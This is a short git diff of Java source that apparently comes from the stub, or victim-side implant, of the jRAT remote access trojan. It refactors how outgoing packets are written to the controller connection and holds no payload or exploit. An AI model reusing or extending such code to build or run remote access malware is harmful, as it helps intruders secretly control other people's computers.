@@ -3,6 +3,7 @@ package se.jrat.stub.packets.outgoing;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
+import se.jrat.stub.Connection;
 
 
 public abstract class AbstractOutgoingPacket {
@@ -10,8 +11,12 @@ public abstract class AbstractOutgoingPacket {
 	public abstract void write(DataOutputStream dos, StringWriter sw) throws Exception;
 
 	public abstract byte getPacketId();
+	
+	public static synchronized final void send(AbstractOutgoingPacket packet) {
+		packet.send(Connection.instance.getDataOutputStream(), Connection.instance.getStringWriter());
+	}
 
-	public synchronized final void send(DataOutputStream dos, StringWriter sw) {
+	private synchronized final void send(DataOutputStream dos, StringWriter sw) {
 		try {
 			dos.writeByte(getPacketId());
 			this.write(dos, sw);
